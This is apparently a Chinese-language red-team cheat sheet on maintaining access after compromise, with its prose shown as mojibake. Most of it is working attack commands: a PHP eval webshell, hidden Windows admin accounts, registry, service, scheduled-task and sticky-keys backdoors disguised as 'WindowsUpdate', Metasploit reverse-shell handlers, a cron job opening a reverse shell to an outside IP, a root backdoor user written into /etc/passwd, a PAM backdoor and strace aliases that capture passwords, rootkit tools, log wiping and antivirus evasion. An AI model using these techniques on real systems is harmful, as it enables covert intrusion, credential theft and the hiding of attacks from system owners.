# æƒé™ç»´æŒç¬”è®°

---

## å…è´£å£°æ˜

`æœ¬æ–‡æ¡£ä»…ä¾›å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨,è¯·å‹¿ä½¿ç”¨æ–‡ä¸­çš„æŠ€æœ¯æºç ç”¨äºéæ³•ç”¨é€”,ä»»ä½•äººé€ æˆçš„ä»»ä½•è´Ÿé¢å½±å“,ä¸æœ¬äººæ— å…³.`

---

# web
## ğŸ”ªcaidao
- [admintony/BypassCaiDao: è¿‡WAFèœåˆ€](https://github.com/admintony/BypassCaiDao)
- [Chora10/Cknife: Cknife](https://github.com/Chora10/Cknife)
- [epinna/weevely3: Weaponized web shell](https://github.com/epinna/weevely3)
- [rebeyond/Behinder: "å†°è"åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ç½‘ç«™ç®¡ç†å®¢æˆ·ç«¯](https://github.com/rebeyond/Behinder)
- **èšå‰‘èµ„æº**
    - [AntSwordProject/antSword: AntSword is a cross-platform website management toolkit.](https://github.com/AntSwordProject/antSword)
    - [AntSwordProject/AntSword-Loader: AntSword åŠ è½½å™¨](https://github.com/AntSwordProject/AntSword-Loader)
    - [virink/as_scanwebshell](https://github.com/virink/as_scanwebshell) - é€šè¿‡æ­£åˆ™åŒ¹é…,æŸ¥æ‰¾åé—¨ webshell
    - [AntSwordProject/AwesomeScript](https://github.com/AntSwordProject/AwesomeScript) - AntSword Shell è„šæœ¬åˆ†äº«/ç¤ºä¾‹
    - [AntSwordProject/AwesomeEncoder](https://github.com/AntSwordProject/AwesomeEncoder) - AntSword è‡ªå®šä¹‰ç¼–(è§£)ç å™¨åˆ†äº«

---

## webshell

<p align="center">
    <img src="../../../../assets/img/å®‰å…¨/ç¬”è®°/RedTeam/æƒé™ç»´æŒç¬”è®°/1.png" width="50%">
</p>

- [JoyChou93/webshell](https://github.com/JoyChou93/webshell) - å…¥ä¾µåˆ†ææ—¶å‘ç°çš„ Webshell åé—¨
- [LandGrey/webshell-detect-bypass](https://github.com/LandGrey/webshell-detect-bypass) - ç»•è¿‡ä¸“ä¸šå·¥å…·æ£€æµ‹çš„ Webshell ç ”ç©¶æ–‡ç« å’Œå…æ€çš„Webshell
- [yzddmr6/webshell-venom](https://github.com/yzddmr6/webshell-venom) - å…æ€webshellæ— é™ç”Ÿæˆå·¥å…·(åˆ©ç”¨éšæœºå¼‚æˆ–æ— é™å…æ€Dç›¾)
- [tennc/webshell](https://github.com/tennc/webshell) - ä¸€ä¸ª webshell æ”¶é›†é¡¹ç›®
- [S9MF/S9MF-php-webshell-bypass](https://github.com/S9MF/S9MF-php-webshell-bypass) - ä¸ºæ–¹ä¾¿WAFå…¥åº“çš„é¡¹ç›® | åˆ†äº«PHPå…æ€å¤§é©¬ | èœæ˜¯åŸç½ª | å¤šå§¿åŠ¿(å‡çš„å°±ä¸€ä¸ª)
- [yzddmr6/as_webshell_venom](https://github.com/yzddmr6/as_webshell_venom) - å…æ€ webshell æ— é™ç”Ÿæˆå·¥å…·èšå‰‘ç‰ˆ
- [backlion/webshell](https://github.com/backlion/webshell) - è¿™æ˜¯ä¸€äº›å¸¸ç”¨çš„ webshell
- ä¸€å¥è¯ `<?php eval($_POST[1]);?>`
- phpinfo `<?php phpinfo() ?>`

**çˆ†ç ´ webshell**
- [shmilylty/cheetah](https://github.com/shmilylty/cheetah)

---

# win
## åé—¨ç”¨æˆ·

```bash
net user PHPNET$ 1234abcd~ /add  # æ·»åŠ ç”¨æˆ·
# Windows çš„å¸å·åç§°åå¸¦ç€"$"ç¬¦å·æ—¶,ä¸ä¼šåœ¨ net user å‘½ä»¤ä¸­æ˜¾ç¤ºå‡ºå¸å·ä¿¡æ¯
net localgroup administrators PHPNET$ /add  # å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†ç»„
net user PHPNET$ /del   # åˆ é™¤ç”¨æˆ·

query user   # æŸ¥çœ‹ä¼šè¯

logoff IDå·  # è¸¢æ‰
```

- [Ch1ngg/AggressorScript-CreateCloneHiddenAccount](https://github.com/Ch1ngg/AggressorScript-CreateCloneHiddenAccount) - åˆ›å»ºä¸€ä¸ªå…‹éš†éšè—çš„ç®¡ç†å‘˜è´¦å·
- [ä½ èƒ½æ‰¾åˆ°æˆ‘ä¹ˆï¼Ÿ-- éšè—ç”¨æˆ·å»ºç«‹(Powershell)](https://evi1cg.me/archives/UserClone.html)

---

## å„ç§æƒé™ç»´æŒåé—¨å§¿åŠ¿

**æ–‡ç« **
- [å†…ç½‘æ¸—é€-æƒé™ç»´æŒ](http://rtshield.top/2019/09/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/)

### MSFæƒé™ç»´æŒ

MSF è‡ªå¸¦ä¸¤ç§æ¤å…¥åé—¨çš„æ–¹å¼

**persistence å¯åŠ¨é¡¹åé—¨**

åŸç†å°±æ˜¯åœ¨ `C:\Users\ç”¨æˆ·å\AppData\Local\Temp` ä¸‹ä¸Šä¼ ä¸€ä¸ª VBS è„šæœ¬ï¼Œé€šè¿‡è¯¥è„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨ `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\` ä¸‹æ–°å»ºä¸€ä¸ªå¼€æœºå¯åŠ¨é¡¹

```bash
# è‡ªåŠ¨åŒ–éƒ¨ç½²
run persistence -A
# è‡ªå®šä¹‰å®‰è£…
run persistence -X -i 5(æ—¶é—´é—´éš”) -p æ”»å‡»è€…ç«¯å£ -r æ”»å‡»è€…IP
```

```bash
use exploit/multi/handle
set payload windows/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <lport>
exploit -j
```

**metsvc æœåŠ¡åé—¨**

åŸç†å°±æ˜¯åœ¨ `C:\Users\ç”¨æˆ·å\AppData\Local\Temp` ä¸‹ä¸Šä¼ ä¸‰ä¸ªæ–‡ä»¶ï¼ˆmetsrvx86.dllã€metsvc-server.exeã€metsvc.exeï¼‰ï¼Œæœ€åå¯åŠ¨ä¸€ä¸ªåä¸º meterpreter çš„æœåŠ¡ä¸”ä¸ºå¼€æœºå¯åŠ¨

```bash
# è‡ªåŠ¨åŒ–å®‰è£…
run metsvc -A
```

```bash
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set RHOST <lhost>
set LPORT 31337(é»˜è®¤)
exploit -j
```

---

### å…¶ä»–æƒé™ç»´æŒ
**æ³¨å†Œè¡¨åé—¨**
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
åŸç†å°±æ˜¯åœ¨æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªé”®å€¼å¯¹ï¼Œé”®å¯å˜ï¼Œå€¼ä¸ºåé—¨ç¨‹åºçš„è·¯å¾„

1. ä¸Šä¼ åé—¨ç¨‹åº

2. éšè—æ–‡ä»¶
    ```
    attrib "C:\Windows\Temp\payload.exe" +h +s
    ```

3. é€šè¿‡æ³¨å†Œè¡¨åŠ å…¥å¯åŠ¨é¡¹
    ```
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
    ```
    `/v` åé¢ä¸ºé”®çš„åç§°ï¼Œ`/t` ä¸ºé”®çš„ç±»å‹ï¼Œ`/d` ä¸ºè¯¥é”®å…·ä½“çš„å€¼ï¼Œ`/f` æ„ä¸ºå¼ºåˆ¶è¦†ç›–ç°æœ‰é¡¹

- æ¸…é™¤åé—¨
    ```
    reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /f
    ```
    åˆ é™¤æ³¨å†Œè¡¨ä¸‹å¯¹åº”çš„é”®å€¼

    ```
    del C:\Windows\Temp\payload.exe
    ```
    æ¸…é™¤åé—¨ç¨‹åº

**userinit æ³¨å†Œè¡¨åé—¨**
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
åŸç†å°±æ˜¯ç”¨æˆ·åœ¨ç™»å½•æ—¶ï¼Œwinlogon ä¼šè‡ªåŠ¨è¿è¡Œå…¶ä¸­æŒ‡å®šçš„ç¨‹åº

- ç›´æ¥å†™å…¥æ³¨å†Œè¡¨
    ```bash
    reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,<powershellä»£ç >" /f
    ```

æˆ–è€…

- ä½¿ç”¨ powershell
    ```powershell
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name Userinit -value "C:\Windows\system32\userinit.exe,<powershellä»£ç >"
    ```

**Logon Scripts åé—¨**
```
HKCU\Environment
```

1. ä¸Šä¼ åé—¨ç¨‹åº

    å°† powershell çš„ä¸€å¥è¯æ‰§è¡Œç¨‹åºç›´æ¥æ”¾å…¥ bat è„šæœ¬ä¸­

2. éšè—åé—¨ç¨‹åº
    ```
    attrib "C:\Windows\Temp\payload.bat" +h +s
    ```

3. å†™å…¥æ³¨å†Œè¡¨
    ```
    reg add HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "C:\Windows\Temp\payload.bat" /f
    ```

- æ¸…é™¤åé—¨
    ```
    reg delete HKCU\Environment /v UserInitMprLogonScript
    ```
    ```
    del C:\Windows\Temp\payload.bat
    ```

**æ˜ åƒåŠ«æŒ**

- https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

éœ€è¦éƒ¨ç½²åé—¨ç¨‹åºï¼Œä½†æ˜¯ä¸æ˜“è¢«å‘ç°
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v GlobalFlag /t REG_DWORD /d 512

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\explorer.exe" /v ReportingMode /t REG_DWORD /d 1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\explorer.exe" /v MonitorProcess /d "C:\Users\Administrator\Desktop\payload.exe"
```

**RunOnceEx åé—¨**

- https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/

éœ€è¦é‡å¯å’Œç®¡ç†å‘˜æƒé™

ç”Ÿæˆæ¶æ„ DLL æ–‡ä»¶ï¼Œå¹¶éƒ¨ç½²
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Windows\Temp\evil.dll"
```

**è‡ªå¯ç›®å½•åé—¨**

å¼€æœºè‡ªå¯åé—¨

1. ä¸Šä¼ åé—¨ç¨‹åº

2. éƒ¨ç½²åé—¨ç¨‹åº
    ```
    copy "C:\Windows\Temp\payload.exe" "C:\Users\ç”¨æˆ·å\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" /y
    ```
    åˆ é™¤å¤šä½™åé—¨å‰¯æœ¬
    ```
    del C:\Windows\Temp\payload.exe
    ```

3. éšè—åé—¨ç¨‹åº
    ```
    attrib "C:\Users\lamba\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe" +h +s
    ```

**æœåŠ¡å¯åŠ¨åé—¨**

å¼€æœºè‡ªå¯æœåŠ¡å¹¶å¯åŠ¨åé—¨

1. ä¸Šä¼ åé—¨ç¨‹åº

2. åˆ›å»º Windows æœåŠ¡
    ```
    sc create "WindowsUpdate" binpath= "cmd /c start C:\Windows\Temp\payload.exe"
    sc config "WindowsUpdate" start= auto
    ```

3. å¯åŠ¨æœåŠ¡
    ```
    net start WindowsUpdate
    ```

- åœæ­¢æœåŠ¡ï¼Œåˆ é™¤æœåŠ¡
    ```
    net stop WindowsUpdate
    sc delete "WindowsUpdate"
    ```

**è®¡åˆ’ä»»åŠ¡åé—¨**

é€šè¿‡è®¡åˆ’ä»»åŠ¡å‘¨æœŸæ‰§è¡Œåé—¨ç¨‹åº

1. ä¸Šä¼ åé—¨ç¨‹åº

2. åˆ›å»ºè®¡åˆ’ä»»åŠ¡
    ```
    schtasks /create /tn WindowsUpdate /tr "C:\Windows\Temp\payload.exe" /sc minute /mo 1
    ```

3. éšè—åé—¨ç¨‹åº
    ```
    attrib "C:\Windows\Temp\payload.exe" +h +s
    ```

- åˆ é™¤è®¡åˆ’ä»»åŠ¡
    ```
    schtasks /delete /tn WindowsUpdate
    ```

**shift åé—¨**

åœ¨ windows ç™»å½•ç•Œé¢å¤„ï¼Œè¿ç»­æŒ‰5æ¬¡ shift æ¥å¯åŠ¨ç²˜æ»é”®ï¼Œå¯åŠ¨ sethc ç¨‹åº

1. æ‹·è´æ–‡ä»¶
    ```
    copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
    copy c:\windows\system32\cmd.exe c:\windows\system32\dllcache\sethc.exe
    ```

2. éšè—æ–‡ä»¶
    ```
    attrib C:\Windows\System32\sethc.exe +h +s
    attrib C:\Windows\System32\dllcache\sethc.exe +h +s
    ```

---

## ç—•è¿¹æ¸…ç†

**åˆ é™¤æ—¥å¿—æ–‡ä»¶**
```bash
net stop eventlog    # åœæ­¢æœåŠ¡
del c:\Windows\System32\Winevt\Logs\* /Q
```
```bash
# åœ¨ meterpreter ä¼šè¯ä¸­
clearev
```

**3389 ç—•è¿¹æ¸…é™¤è„šæœ¬**
```
echo off
color 0A
title 3389è¿æ¥ç—•è¿¹æ¸…é™¤
mode con cols=88 lines=20
set /p fk= ç¡®å®šè¦æ¸…ç©º3389è¿æ¥ç—•è¿¹å—ï¼Ÿ(y/n)
if /i "%fk%"=="y" goto y
if /i "%fk%"=="n" goto n
call %0

:y
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client" /f
del /a /f /q %HOMEPATH%\Documents\Default.rdp
echo å‘½ä»¤æ‰§è¡ŒæˆåŠŸ,è¯·æ‰‹åŠ¨æŸ¥çœ‹æ˜¯å¦æ¸…é™¤.
pause >nul

:n
exit
```

---

# linux
## å‘½ä»¤åå°è¿è¡Œ

å½“ç”¨æˆ·æ³¨é”€(logout)æˆ–è€…ç½‘ç»œæ–­å¼€æ—¶,ç»ˆç«¯ä¼šæ”¶ HUP(hangup)ä¿¡å·ä»è€Œå…³é—­å…¶æ‰€æœ‰å­è¿›ç¨‹.å› æ­¤,è§£å†³åŠæ³•æœ‰ä¸¤ç§é€”å¾„:è¦ä¹ˆè®©è¿›ç¨‹å¿½ç•¥ HUP ä¿¡å·,è¦ä¹ˆè®©è¿›ç¨‹è¿è¡Œåœ¨æ–°çš„ä¼šè¯é‡Œä»è€Œæˆä¸ºä¸å±äºæ­¤ç»ˆç«¯çš„å­è¿›ç¨‹.

1. ä½¿ç”¨ nohup å‘½ä»¤,è®©æäº¤çš„å‘½ä»¤å¿½ç•¥ hangup ä¿¡å·.
```
nohup ping www.baidu.com &
```

2. ä½¿ç”¨ setsid å‘½ä»¤,è®©å‘½ä»¤åœ¨ä¸å±äºç»ˆç«¯çš„å­è¿›ç¨‹å½“ä¸­æ‰§è¡Œ.
```
setsid ping www.baidu.com &
```

3. ä½¿ç”¨ disown å‘½ä»¤,è®©æŸä¸ªä½œä¸šå¿½ç•¥ hangup ä¿¡å·
```
disown -h %1
```

4. ä½¿ç”¨ screen å‘½ä»¤ å»ºç«‹æ–­å¼€æ¨¡å¼çš„ä¼šè¯(åŸç†å’Œ setid ä¸€æ ·,åªä¸è¿‡ç›´æ¥æ„é€ äº†ä¸€ä¸ªç¯å¢ƒ)
```bash
screen -S <name>
```

---

## åé—¨éšè—è¿›ç¨‹

**æ–‡ç« **
- [linuxå¸¸è§backdooråŠæ’æŸ¥æŠ€æœ¯](https://xz.aliyun.com/t/4090)
- [Linuxåé—¨æ•´ç†åˆé›†](https://www.secpulse.com/archives/59674.html)

**æ·»åŠ  root æƒé™åé—¨ç”¨æˆ·**

æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­è¿½åŠ ä¸€æ¡,ä¸€ä¸ªå¸¦æœ‰å¯†æ–‡ä¸” id ä¸º 0 çš„è´¦å·.

å¯†ç åŠ å¯†ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ `perl -e 'print crypt("password", "AA"). "\n"'`

æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæƒ³è¦åœ¨ passwd æ–‡ä»¶ä¸­çš„æ¡ç›®æ˜¯è¿™ä¸ªæ ·å­ `backdoor:AA6tQYSfGxd/A/A:0:0:me:/root:/bin/bash`

æ‰§è¡Œå†™å…¥ `echo "backdoor:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash">>/etc/passwd`

**Crond å¼€æœºè‡ªå¯åé—¨**

å…ˆåˆ›å»º /etc/xxxx è„šæœ¬æ–‡ä»¶(åå­—è‡ªå·±æ”¹),åˆ©ç”¨è¯¥è„šæœ¬è¿›è¡Œåå¼¹.ä»¥ä¸‹è„šæœ¬ä»£è¡¨å…¨è‡ªåŠ¨åå¼¹åˆ° 8.8.8.8 çš„ 53 ç«¯å£.
```vim
vim /etc/xxxx
    #!/bin/bash
    if netstat -ano|grep -v grep | grep "8.8.8.8">/dev/null
    then
    echo "OK">/dev/null
    else
    /sbin/iptables --policy INPUT ACCEPT
    /sbin/iptables --policy OUTPUT ACCEPT
    bash -i >& /dev/tcp/8.8.8.8/53 0>&1
    fi

chmod +sx /etc/xxxx
```
```vim
vim /etc/crontab
    */1 * * * * root /etc/xxxx

service cron reload #ä¸åŒå‘è¡Œç‰ˆé‡å¯æ–¹å¼ä¸ä¸€æ ·
service cron start
```

ç„¶ååœ¨ 8.8.8.8 çš„æœåŠ¡å™¨ä¸Šä½¿ç”¨ NC æ¥æ”¶ Shell å³å¯.

`nc -vv -lp 53`

**SUID shell**

é¦–å…ˆ, å…ˆåˆ‡æ¢æˆä¸º root ç”¨æˆ·,å¹¶æ‰§è¡Œä»¥ä¸‹çš„å‘½ä»¤:
```bash
dawg:~# cp /bin/bash /.woot
dawg:~# chmod 4755 /.woot
dawg:~# ls -al /.woot
-rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
```
å½“ç„¶, ä½ ä¹Ÿå¯ä»¥èµ·å…¶ä»–æ›´å…·å¤‡éšè—æ€§çš„åå­—,æˆ‘æƒ³çŒ¥çå¹¶æœºæ™ºçš„ä½ ,è‚¯å®šèƒ½æƒ³å‡ºå¾ˆå¤šå¥½çš„åå­—çš„.
æ–‡ä»¶å‰é¢çš„é‚£ä¸€ç‚¹ä¹Ÿä¸æ˜¯å¿…è¦çš„,åªæ˜¯ä¸ºäº†éšè—æ–‡ä»¶( åœ¨æ–‡ä»¶åçš„æœ€å‰é¢åŠ ä¸Š".",å°±å¯ä»¥åœ¨ä»»æ„æ–‡ä»¶ç›®å½•ä¸‹è¿›è¡Œéšè—) .
```bash
# ç°åœ¨,åšä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·,æˆ‘ä»¬æ¥å¯ç”¨è¿™ä¸ªåé—¨:
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw)
id
    uid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b$
# ä¸ºä»€ä¹ˆä¸è¡Œå‘¢? å› ä¸º bash2 é’ˆå¯¹ suidæœ‰ä¸€äº›æŠ¤å«çš„æªæ–½. ä½†è¿™ä¹Ÿä¸æ˜¯ä¸å¯ç ´çš„:
```
```bash
/.woot -p
id
    uid=1000(fw) gid=1000(fw) euid=0(root) groups=1000(fw)
# ä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shell. è¿™ä¸ªeuidçš„æ„æ€æ˜¯ effective user id
# è¿™é‡Œè¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯,ä½œä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªSUID shellæ—¶,ä¸€å®šè¦ä½¿ç”¨å…¨è·¯å¾„.
```
å¦‚ä½•æŸ¥æ‰¾é‚£äº›å…·æœ‰ SUID çš„æ–‡ä»¶: `dawg:~# find / -perm +4000 -ls` è¿™æ—¶å°±ä¼šè¿”å›å…·æœ‰ SUID ä½çš„æ–‡ä»¶å•¦.

**è¿œç¨‹åé—¨**

```vim
vim /etc/inetd.conf
    #discard stream tcp nowait root internal
    #discard dgram udp wait root internal
    daytime stream tcp nowait root /bin/bash bash -i

inetd
ç„¶åå°±å¯ä»¥ç”¨ nc æ¥çˆ†èŠ
```
å¯ä»¥ä¿®æ”¹/etc/servicesæ–‡ä»¶,åŠ å…¥ä»¥ä¸‹çš„ä¸œè¥¿
```vim
vim /etc/services
    woot 6666/tcp #evil backdoor service
vim /etc/inetd.conf
    woot stream tcp nowait root /bin/bash bash -i
```

**PAM åé—¨**

ä¸»è¦æ€è·¯:pam_unix_auth.c æ‰“è¡¥ä¸å®‰è£…åˆ°æ­£å¸¸çš„ PAM æ¨¡å—ä¸­.
1ã€è·å–ç›®æ ‡ç³»ç»Ÿæ‰€ä½¿ç”¨çš„ PAM ç‰ˆæœ¬:
`rpm -qa |grep pam`
2ã€ç¼–è¯‘å®‰è£… PAM
3ã€å°†æœ¬åœ° pam_unix_auth.c æ–‡ä»¶é€šè¿‡æ‰“è¡¥ä¸æ–¹å¼,ç¼–è¯‘ç”Ÿæˆ.
4ã€ç¼–è¯‘å®Œåçš„æ–‡ä»¶åœ¨:modules/pam_unix/.libs/pam_unix.so,åé—¨å¯†ç ä¸º root123,å¹¶ä¼šåœ¨ /tmp/pslog è®°å½• root ç™»å½•å¯†ç .

**vim åé—¨**

æ­¤æ–¹æ³•é€‚ç”¨äºå®‰è£…äº† vim ä¸”å®‰è£…äº† python æ‰©å±•(ç»å¤§ç‰ˆæœ¬é»˜è®¤å®‰è£…)çš„ linux ç³»ç»Ÿ,è‡³äºæ¶æ„è„šæœ¬ dir.py çš„å†…å®¹å¯ä»¥æ˜¯ä»»ä½•åŠŸèƒ½çš„åé—¨.å¦‚ python ç‰ˆæœ¬çš„æ­£å‘åé—¨ç›‘å¬ 11 ç«¯å£.

æ£€æµ‹æœ‰æ— æ‰©å±•
```bash
vim --version | grep python
```

enter the mal script directory ã€execute the script and then remove the script
`cd /usr/lib/python2.7/site-packages`

```python
vim dir.py
#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('0.0.0.0',11))
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr
        proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,
                stdout=talk, stderr=talk, shell=True)
```
`$(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py`

read more [[DARK] Weapons of Text Destruction](https://github.com/jaredestroud/WOTD/blob/master/%5BDARK%5D%20Weapons%20of%20%20Text%20Destruction.pdf)

**ç»ˆç«¯è§£æ \r å¯¼è‡´çš„é—®é¢˜**
```bash
echo -e "<?=\`\$_POST[good]\`?>\r<?='PHP Test Page >||<                  ';?>" >/var/www/html/test.php
```

**strace è®°å½• ssh ç™»å½•å¯†ç **

æ³¨æ„ bash_profile æ˜¯åœ¨ç™»å½•çš„ shell æ‰§è¡Œçš„,bashrc æ˜¯åœ¨éç™»å½•çš„ shell æ‰§è¡Œ,å³å¦‚æœä½ åªæ˜¯æƒ³æ¯æ¬¡åœ¨ç™»å½•çš„æ—¶å€™è®©å®ƒå»æ‰§è¡Œ,è¿™ä¸ªæ—¶å€™ä½ å¯ä»¥æŠŠä½ çš„å‘½ä»¤å†™åœ¨ .bash_profile,å¦‚æœä½ æƒ³æ¯æ¬¡æ‰“å¼€ä¸€ä¸ªæ–°çš„ç»ˆç«¯çš„æ—¶å€™éƒ½å»æ‰§è¡Œ,é‚£ä¹ˆåº”è¯¥æŠŠå‘½ä»¤å†™åœ¨ .bashrc ä¸­.
```bash
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 ssh'
# ä¹Ÿå¯è®°å½• su å¯†ç 
alias su='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
 -e read,write,connect  -s2048 su'

grep "read(3" /tmp/sshpwd-åå­—è‡ªå·±è¡¥å…¨  | tail -n 11
```

**é¢„åŠ è½½å‹åŠ¨æ€é“¾æ¥åº“åé—¨ ld.so.preload**

åœ¨ linux ä¸‹æ‰§è¡ŒæŸä¸ªå¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰,ç³»ç»Ÿä¼šé¢„å…ˆåŠ è½½ç”¨æˆ·å®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“çš„ä¸€ç§æŠ€æœ¯,è¿™ä¸ªæŠ€æœ¯å¯ä»¥é‡å†™ç³»ç»Ÿçš„åº“å‡½æ•°,å¯¼è‡´å‘ç”Ÿ Hijack
strace å‘½ä»¤ id çš„æ—¶å€™å¯ä»¥å‘ç°æœ‰é¢„å…ˆå»è¯»å– `/etc/ld.so.preload` æ–‡ä»¶(ä¹Ÿå¯ä½¿ç”¨è®¾ç½® LD_PRELAOD ç¯å¢ƒå˜é‡æ–¹å¼),å¦‚æœæˆ‘ä»¬å°†äº‹å…ˆå†™å¥½çš„æ¶æ„ so æ–‡ä»¶ä½ç½®å†™å…¥ ld.so.preload æ–‡ä»¶,è¿™ä¸ªæ—¶å€™å°±ä¼šè¾¾åˆ°"åŠ«æŒ"çš„æ•ˆæœ.
æ¯”è¾ƒå¥½ç”¨çš„å·¥å…·æœ‰ Vegile å’Œ cub3 ç­‰
[cub3](https://github.com/mempodippy/cub3),è¿™ä¸ªå·¥å…·ä½¿ç”¨äº† LD_PRELOAD å’Œç³»ç»Ÿçš„æ‰©å±•å±æ€§å»éšè—æ–‡ä»¶.
å…¶ä¸­è¿˜æœ‰ä¸€ç§æ˜¯é€šè¿‡ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨æ¥åŠ è½½æ¶æ„åŠ¨æ€é“¾æ¥åº“çš„åé—¨,é€šè¿‡æ›¿æ¢æˆ–è€…ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨ä¸­çš„é»˜è®¤é¢„åŠ è½½é…ç½®æ–‡ä»¶ `/etc/ld.so.preload` è·¯å¾„çš„ rootkit,æ­¤æ–¹æ³•æ›´åŠ éšè”½,è¿™ä¸ªæ–¹æ³•çš„è¾ƒæˆç†Ÿçš„åˆ©ç”¨å·¥å…·æ˜¯ [Vlany](https://github.com/mempodippy/vlany)

**è¿›ç¨‹æ³¨å…¥**

ä½¿ç”¨ ptrace å‘è¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„ so æ–‡ä»¶å·¥å…·[linux-inject](https://github.com/gaffe23/linux-inject/)

**å†…æ ¸çº§ rootkit**

å¦‚ mafixã€[Diamorphine](https://github.com/m0nad/Diamorphine)

**è—æ–‡ä»¶å’Œæ–‡ä»¶å¤¹**
1. æ¯”å¦‚åˆ›å»ºä¸€ä¸ªåå­—å¼€å¤´å¸¦ `.` çš„ Webshell æˆ–è€…æ–‡ä»¶å¤¹,é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥çš„,æµè§ˆå™¨è®¿é—®çš„æ—¶å€™åŠ ç‚¹è®¿é—®å°±è¡Œ.(æŸ¥çœ‹æ–¹æ³•:ls -a)

    ```
    touch .webshell.php    åˆ›å»ºåå­—ä¸º .webshell.php çš„æ–‡ä»¶
    mkdir .backdoor/       åˆ›å»ºåå­—ä¸º .backdoor çš„æ–‡ä»¶å¤¹
    ```

2. é™¤éåœ¨ç®¡ç†å‘˜å–å¤šäº†æˆ–è€…è„‘å­è½¬ä¸è¿‡æ¥çš„æƒ…å†µä¸‹,æ˜¯ç»å¯¹ä¸ä¼šå‘ç°çš„!è‡³å°‘æˆ‘ç”¨äº†è¿™ä¹ˆä¹…æ˜¯æ²¡å‡ ä¸ªå‘ç°çš„.å¦‚æœæ˜¯æ–‡ä»¶çš„è¯æµè§ˆå™¨è®¿é—®ç›´æ¥è¾“ ... å°±è¡Œ,ç›®å½•åŒç†.

    ```
    touch ...       åˆ›å»ºåå­—ä¸º ... çš„æ–‡ä»¶
    mkdir ...       åˆ›å»ºåå­—ä¸º ... çš„æ–‡ä»¶å¤¹
    ```

**Linux/Unix ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³**

ç›´æ¥å°†æ—¶é—´æˆ³ä¿®æ”¹æˆæŸå¹´æŸæœˆæŸæ—¥.å¦‚ä¸‹ 2014 å¹´ 01 æœˆ 02 æ—¥.
`touch -t 1401021042.30 webshell.php`

**å·¥å…·**
- **Vegile**
    - https://github.com/Screetsec/Vegile.git

---

## ç—•è¿¹æ¸…ç†

- [å¼€å°ç¶:éšè—bashå†å²å‘½ä»¤çš„å°æŠ€å·§](http://www.4hou.com/system/13988.html)
- [Ubuntu bashä¸è®°å½•historyæ–¹æ³•](https://www.cnblogs.com/sevck/p/7997739.html)

**web æ—¥å¿—**

å¦‚ access.log,error.log.ä½¿ç”¨ sed è¿›è¡Œå®šå‘æ¸…é™¤

`sed -i -e '/192.169.1.1/d'`

**history**

å¯¹ ~/.bash_history è¿›è¡Œå®šå‘æ¸…é™¤

---

# BypassAV

**æ€è½¯é€ŸæŸ¥**
- [r00tSe7en/get_AV](https://github.com/r00tSe7en/get_AV)

**Metasploit**
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost
set lport
run
```

